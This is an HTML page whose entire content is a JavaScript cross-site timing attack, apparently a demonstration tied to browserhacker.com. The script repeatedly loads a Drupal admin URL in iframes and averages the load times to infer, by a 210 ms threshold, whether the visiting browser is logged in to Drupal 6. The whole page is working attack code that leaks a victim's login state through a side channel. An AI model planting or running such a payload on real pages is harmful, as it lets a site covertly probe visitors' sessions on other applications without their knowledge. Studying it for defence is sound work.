<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title></title>
</head>
<body>
    <script type="text/javascript">
        var add_iframe;
        var counter = 5;
        var sum = 0;
        /* Average time to match. In this case for
        the http://browserhacker.com/drupal/?q=admin
        resource:
        logged in takes > 210ms
        not logged in takes < 210ms
        */
        var avg_to_match = 210;
        function append() {
            if (counter > 0) {
                var i = document.createElement("iframe");
                i.src = "http://browserhacker.com/drupal/?q=admin";
                var start = new Date().getTime();
                console.log('start:' + start);

                /* Custom onload handler to monitor load time*/
                i.onload = function () {
                    var end = new Date().getTime();
                    console.log('end:' + end);
                    var total = end - start;
                    console.log('total:' + total);
                    sum += total;
                    counter--;
                }
                document.body.appendChild(i);
            } else {
                clearInterval(add_iframe);
                var avg = sum / 5;
                var logged_in = true;
                console.log("sum: " + sum + ", avg:" + avg);
                if (avg < 210) {
                    logged_in = false;
                }
                console.log("logged in Drupal 6: " + logged_in);
            }
        }
        add_iframe = setInterval(function () { append() }, 500);
    </script>
</body>
</html>
